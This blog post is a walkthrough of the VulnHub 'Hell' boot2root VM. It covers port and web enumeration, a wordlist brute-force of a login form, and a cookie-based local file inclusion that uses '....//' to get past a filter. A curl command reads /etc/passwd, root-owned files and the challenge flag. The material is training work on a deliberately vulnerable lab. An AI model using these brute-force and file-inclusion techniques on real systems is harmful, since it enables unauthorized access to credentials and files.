---
layout: post
title: "Hell Hacking Challenge"
date: 2014-07-15 13:27:03 -0400
comments: true
categories: boot2root
---

One of the latest and more challenging boot2roots released on [VulnHub](http://www.vulnhub.com) as of late is [Hell](http://vulnhub.com/entry/hell-1,95/). This boot2root by [Peleus](http://www.twitter.com/0x42424242) has appeared to cause quite a bit of hair pulling and teeth gnashing whenever it's mentioned on IRC. I initially started off with his beta version but had to put it away when I got too busy with work. When I was finally ready to try again, the official version had been released, so I downloaded it and started over. 

<!--more-->

The goal of the challenge is to read /root/flag.txt. I found a way to solve the challenge without getting shell on the target. I think this might be a bug, and at some point I might try to solve it the way it was intended. Still, it's a solution, so without further ado, here's the shortcut method of solving Hell. 

### Enumeration

Using netdiscover, I found the IP address for Hell at 172.16.229.151. An nmap scan on the target revealed quite a few open ports. 

```
# nmap -p- 172.16.229.151

Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-15 14:02 EDT
Nmap scan report for 172.16.229.151
Host is up (0.00015s latency).
Not shown: 65529 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
111/tcp   open     rpcbind
666/tcp   open     doom
1337/tcp  filtered waste
48899/tcp open     unknown
MAC Address: 00:0C:29:FC:55:83 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 19.08 seconds
```

Port 80 was open, I decided to start enumerating the webserver first. I fired up nikto for a quick scan:

```
# nikto -h http://172.16.229.151
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.229.151
+ Target Hostname:    172.16.229.151
+ Target Port:        80
+ Start Time:         2014-07-15 14:03:54 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Server leaks inodes via ETags, header found with file /, inode: 277996, size: 466, mtime: Thu Jun 19 21:19:55 2014
+ The anti-clickjacking X-Frame-Options header is not present.
+ File/dir '/personal/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Retrieved x-powered-by header: PHP/5.4.4-14+deb7u11
+ Cookie PHPSESSID created without the httponly flag
+ File/dir '/super_secret_login_path_muhahaha/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7357 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2014-07-15 14:04:04 (GMT-4) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nikto found two hidden directories listed in the robots.txt file; /personal, and /super_secret_login_path_muhahaha. 

I used wfuzz to see if I could find any hidden files and directories at the root directory, at /personal, and at /super_secret_login_path_muhahaha. The latter showed a couple of interesting results:

```
# wfuzz --hc 404 -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://172.16.229.151/super_secret_login_path_muhahaha/FUZZ

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://172.16.229.151/super_secret_login_path_muhahaha/FUZZ
Payload type: file,/usr/share/wfuzz/wordlist/general/big.txt

Total requests: 3036
==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00012:  C=200      7 L	      11 W	     88 Ch	  " - 1"
02798:  C=200   5606 L	   35201 W	  1028165 Ch	  " - server"
```

It was time to load it up into a web browser and see what was going on. I hooked up Iceweasel to BurpSuite and navigated to http://172.16.229.151

->![](/images/2014-07-15/1.png)<-

A couple of clues are provided on this page. Something is running on port 666 (which nmap already found), and the admin's name is Jack. 

Nothing else of interest, so I moved on to the next page, /personal, which turned out to be a page dedicated to VulnHub's founder, g0tmi1k

->![](/images/2014-07-15/2.png)<-

So Jack is obsessed with g0tmi1k. Nothing more to see on this webpage, so I moved on to the next webpage, /super_secret_login_path_muhahaha

->![](/images/2014-07-15/3.png)<-

Finally something interesting, a login page. I'd need to get back to this later on. 

Next I checked the files super_secret_login_path_muhahaha1 and super_secret_login_path_muhahahaserver that wfuzz found earlier. I started with /super_secret_login_path_muhahaha/1 which displayed an intruder alert message:

->![](/images/2014-07-15/5.png)<-

This was probably displayed when an incorrect login was used, possibly for the login form. 

Finally there was /super_secret_login_path_muhahaha/server which turned out to be some comical animated gif. 

### Bruteforcing the login form

Back to the login form, I tried variations of commonly used login credentials and some SQL injection but nothing worked. I also never saw that intruder alert message come up at any time. Then I remembered reading an interesting hint from the description section of Hell on VulnHub:

> A few of the skills needed can be seen in some posts on http://netsec.ws.

So I went over to Peleus' blog and picked out a couple of interesting posts:

 * [Raider](http://netsec.ws/?p=494). This is a tool to bruteforce login forms. Perfect for the current challenge. 
 * [Generating Wordlists](http://netsec.ws/?p=457). This talks about using cewl to generate wordlists from the website, and then using John the Ripper to mutate the wordlist using its ruleset. 

Using cewl, I generated a wordlist from all three directories on the website. Since the directories weren't referenced from each other, I created /var/www/crawl.html on my machine with the following:

```html
<html>
<a href="http://172.16.229.151/">1</a>
<a href="http://172.16.229.151/personal/">2</a>
<a href="http://172.16.229.151/super_secret_login_path_muhahaha/">3</a>
</html>
```

This way I just had to run cewl once to crawl all three directories: 

```text
# cewl -o -w cewllist.txt http://localhost/crawl.html
CeWL 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)

# wc -l cewllist.txt 
109 cewllist.txt
```

109 entries were saved in the wordlist. Next step was to mutate them using john. I added the following rules to the [List.Rules:Wordlist] ruleset in /etc/john/john.conf

```
# append 1-2 numbers at the end of each word
$[0-9]
$[0-9]$[0-9]
# prefix 1-2 numbers at the start of each word
^[0-9]
^[0-9]^[0-9]
```

With that done, I ran cewllist.txt against john to mutate it and saved the output to wordlist.txt

```
# john --wordlist=cewllist.txt --rules --stdout > wordlist.txt
words: 29246  time: 0:00:00:00 DONE (Tue Jul 15 14:45:01 2014)  w/s: 1462K  current: 99Password
```

The generated list was fairly big, at 29,246 words. I hoped that there were no security measures that would slow down a bruteforce attack on the login form. 

Before I could use raider, I needed to capture the HTTP headers sent by the login form. Since BurpSuite was already running, I turned on the proxy intercept and logged in with username jack (the only user I know that exists so far), and a dummy password, letmein. BurpSuite captured the request: 

->![](/images/2014-07-15/4.png)<-

I saved this into header.txt and modified the password value to ^%letmein^% as described by raider. 

```
# cat header.txt 
POST /super_secret_login_path_muhahaha/login.php HTTP/1.1
Host: 172.16.229.151
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140610 Firefox/24.0 Iceweasel/24.6.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.229.151/super_secret_login_path_muhahaha/
Cookie: PHPSESSID=2bcc5t4g72043ronu46mtkmi32
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

username=jack&password=^%letmein^%&mysubmit=Login
```

With the wordlist ready and the HTTP headers captured, I passed them to raider and let it do its magic:

```
# python raider.py --wordlist ~/hell/wordlist.txt --header ~/hell/header.txt -s 2 --keyword Failed --attack 1
```

After a couple of minutes, I was able to obtain the password for jack:

```
[-] Size: 220	Response Code: 200	Req ID: 13876
[-] Size: 220	Response Code: 200	Req ID: 13877
[-] Size: 220	Response Code: 200	Req ID: 13878
[+] Size: 239	Response Code: 200	Req ID: 13879	Success!! Fuzz Value: g0tmi1k69
```

I logged in and was presented with a set of folders:  

->![](/images/2014-07-15/6.png)<-

### Local file inclusion

Of these folders, Personal Folder and Notes were the most interesting. The Notes folder allowed the user to create a text file that was stored in some temporary directory. 

->![](/images/2014-07-15/7.png)<-

I assumed that this would be in /tmp or /var/tmp, or possibly some other hidden temporary directory elsewhere. For now there was no way to read it so I created a note that contained the text "superkojiman was here"

I examined Personal Folder next. This was another login form, similar to the first. 

->![](/images/2014-07-15/8.png)<-

I still had BurpSuite intercepting requests and responses, so I attempted to login with the same credentials as before. The server replied by setting a cookie, failcount to 1. 

->![](/images/2014-07-15/9.png)<-

I kept going and the final reply from the server was an incorrect login and that I had used up one of my three attempts at logging in. 

->![](/images/2014-07-15/10.png)<-

I tested it a couple more times and when failcount was 3, a new cookie was set by the server, intruder which had the value 1: 

->![](/images/2014-07-15/11.png)<-

This in turn finally triggered that intruder alert message I had seen earlier. 

->![](/images/2014-07-15/12.png)<-

So the contents of super_secret_login_path_muhahaha/1 were being added into the panel.php. It took me a while to make the connection that the value 1 assigned to the intruder cookie was the actual file super_secret_login_path_muhahaha/1, and not some boolean value for "true". Once that clicked, I knew I had found a local file inclusion vulnerability. 

After a bit of trial and error, I realized that some filtering was taking place as the traditional ../../../../../etc/passwd wasn't working. As it turned out, ../ was being removed, so to evade this filter, I used ....// instead. Sure enough, I was able to read /etc/passwd using curl and passing it the file to read in the cookie: 

```
# curl -b "PHPSESSID=2bcc5t4g72043ronu46mtkmi32; intruder=....//....//....//....//....//....//etc/passwd" 172.16.229.151/super_secret_login_path_muhahaha/panel.php

<HTML>
.
.
.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
george:x:1000:1000:george,,,:/home/george:/bin/bash
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
jack:x:1001:1001::/home/jack:/bin/sh
milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
developers:x:1003:1003::/home/developers:/bin/sh
bazza:x:1004:1004::/home/bazza:/bin/sh
oj:x:1005:1005::/home/oj:/bin/sh
</HTML>
```

### Let's get that flag!

I used the file inclusion vulnerability to read the contents of some common files in /etc and happened upon some interesting content in /etc/rc.local: 

```bash
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
/sbin/iptables-restore < /root/firewall.rules
/root/echoserver.py&
exit 0
```

Out of curiousity, I decided to read the contents of /root/firewall.rules. As soon as I punched it in, I realized I would probably get no output as /root was most likely not readable. As it turned out, I was wrong! 

```text
# Generated by iptables-save v1.4.14 on Fri Jun 20 11:13:53 2014
*filter
:INPUT ACCEPT [3:456]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -i eth0 -p tcp -m tcp --dport 1337 -j DROP
COMMIT
# Completed on Fri Jun 20 11:13:53 2014
```

If I could read this file, could I also read /root/flag.txt? Yes!

```
Congratulations of beating Hell. 

I hope you enjoyed it and there weren't to many trolls in here for you. 

Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242

Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
```

And there you have it, a shortcut method of solving Hell, without getting shell, and without getting root. I'm not sure if this was some bug that made it into the final release, or if it was an intended shortcut. Thanks to Peleus for providing the challenge, I'm looking forward to the next one. 
